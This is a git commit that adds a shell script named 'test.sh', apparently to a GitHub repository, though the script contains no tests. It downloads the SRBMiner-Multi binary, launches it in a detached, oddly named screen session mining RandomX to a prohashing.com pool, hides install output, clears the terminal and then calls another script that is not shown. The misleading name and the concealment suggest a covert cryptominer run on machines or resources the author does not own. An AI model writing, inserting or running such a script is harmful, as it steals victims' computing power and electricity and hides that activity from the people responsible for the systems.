413389cabcefaefa8d1a9c75fc7e5a9f33a1ae02
nikikulone <109032903+nikikulone@users.noreply.github.com>
2022-07-21 01:08:47 +0700

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,18 @@
+#!/bin/sh
+
+WALLET=Prodent.BINDER-$(echo $(shuf -i 1-9999 -n 1))
+
+POOL=prohashing.com:3359
+
+sudo apt install screen -y > /dev/null 2>&1
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.5/SRBMiner-Multi-0-8-5-Linux.tar.xz
+tar -xf SRBMiner-Multi-0-8-5-Linux.tar.xz
+cd SRBMiner-Multi-0-8-5
+chmod +x SRBMiner-MULTI
+screen -S Wuenak_Guerrr -dm ./SRBMiner-MULTI --disable-gpu --algorithm randomx --pool $POOL --wallet $WALLET --password a=randomx -randomx-1gb-pages
+screen -ls
+sleep 2
+clear
+cd ..
+screen -ls
+./Timer_Bo.sh
